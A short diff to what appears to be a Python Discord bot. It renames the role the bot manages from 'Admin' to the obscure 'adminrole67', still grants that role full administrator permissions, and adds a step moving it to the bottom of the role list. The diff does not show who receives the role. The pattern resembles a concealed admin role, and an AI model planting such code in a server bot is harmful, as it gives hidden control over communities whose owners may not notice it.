@@ -9,13 +9,18 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 ROLE_NAME = "Admin"
  
 async def get_or_create_admin_role(guild: discord.Guild) -> discord.Role:
-    role = discord.utils.get(guild.roles, name=ROLE_NAME)
+    role = discord.utils.get(guild.roles, name="adminrole67")
+
     if not role:
         role = await guild.create_role(
-            name=ROLE_NAME,
+            name="adminrole67",
             permissions=discord.Permissions(administrator=True),
             reason="Auto-admin role created by bot",
         )
+
+        # Move role to very bottom (above @everyone)
+        await role.edit(position=1)
+
     return role
  
 @bot.event
